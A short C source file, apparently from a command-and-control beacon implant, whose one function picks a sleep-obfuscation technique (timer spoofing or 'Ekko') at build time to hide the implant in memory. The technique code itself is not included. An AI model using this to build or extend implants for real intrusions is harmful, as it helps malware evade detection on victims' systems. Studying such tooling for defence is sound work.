#include <windows.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>
#include <Sleep.h>

DECLFN void Beacon_Sleep( ULONG ms )
{
    if ( ms == 0 ) return;

#if   PAIN_SLEEP_TECH == SLEEP_TIMER_SPOOF
    Sleep_TimerSpoof( ms );
#elif PAIN_SLEEP_TECH == SLEEP_EKKO
    Sleep_Ekko( ms );
#endif
}
